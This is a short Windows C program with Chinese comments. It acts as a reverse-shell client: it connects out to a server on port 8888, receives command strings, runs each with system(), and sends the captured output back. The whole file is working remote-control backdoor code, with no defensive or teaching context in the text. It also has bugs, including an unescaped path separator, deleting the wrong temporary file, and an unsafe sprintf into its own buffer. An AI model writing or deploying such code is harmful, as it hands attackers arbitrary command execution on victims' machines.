
#include <winsock2.h>
#include <stdio.h>
#include <windows.h>

#pragma comment(lib,"WS2_32.lib")


int main(int argc, char* argv[])
{
	WSADATA wsaData;
	SOCKET s;
	SOCKADDR_IN servAddr;
	char szCmd[64];        //控制指令缓存区
	char szBuff[1024*8];   //反馈信息缓存区
	int nSend, nRecv;
	char szTmpFile[256];
	HANDLE hFile;
	DWORD dwRead;
	
	//初始化WS2_32.dll
	WORD sockVersion = MAKEWORD(2, 0);
	WSAStartup(sockVersion, &wsaData);
	
	//创建套接字
	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(s == INVALID_SOCKET)
	{
		printf("Failed socket() \n");
		WSACleanup();
		return 0;
	}
	
	//也可以在这里调用bind函数绑定一个本地地址，否则系统将会自动安排
	
	//填写远程地址信息
	servAddr.sin_family = AF_INET;
	servAddr.sin_port = htons(8888);
	servAddr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");   //填写服务器端的IP地址
	
	if(connect(s, (PSOCKADDR_IN)&servAddr, sizeof(servAddr)) == -1)
	{
		printf("Failed connect() \n");
		WSACleanup();
		return 0;
	}
	
	//循环处理来自服务器端的控制指令
	while(1)
	{
		memset(szCmd, 0, sizeof(szCmd));
		memset(szBuff, 0, sizeof(szBuff));
		
		//接收控制指令
		nRecv = recv(s, szCmd, sizeof(szCmd), 0);
		if(nRecv > 0)
		{
			szCmd[nRecv] = '\0';
		}
		printf("Execute Command: %s\n", szCmd);
		
		//执行命令并将输出结果重定向到临时文件
		GetTempPath(sizeof(szTmpFile), szTmpFile);
		strcat(szTmpFile, "\cmd.tmp");
		sprintf(szCmd, "%s >%s", szCmd, szTmpFile);
		system(szCmd);
		
		memset(szBuff, 0, sizeof(szBuff));
		hFile = CreateFile(szTmpFile, GENERIC_READ|GENERIC_WRITE, 
		                       FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
		                     OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if(hFile == INVALID_HANDLE_VALUE)
		{
			MessageBox(NULL, "Temp file can not open", "Error", MB_OK);
		}
		ReadFile(hFile, &szBuff, sizeof(szBuff), &dwRead, NULL);
		
		//把反馈信息发送到服务器端
		nSend = send(s, szBuff, sizeof(szBuff), 0);
		if(nSend == SOCKET_ERROR)
		{
			MessageBox(NULL, "Server has been shut down", "Error", MB_OK);
			break;
		}
		
		//清理临时文件
		CloseHandle(hFile);
		DeleteFile("C:\\temp.txt");
	}
	
	//关闭套节字
	closesocket(s);
	//释放WS2_32库
	WSACleanup();
	
	return 0;
}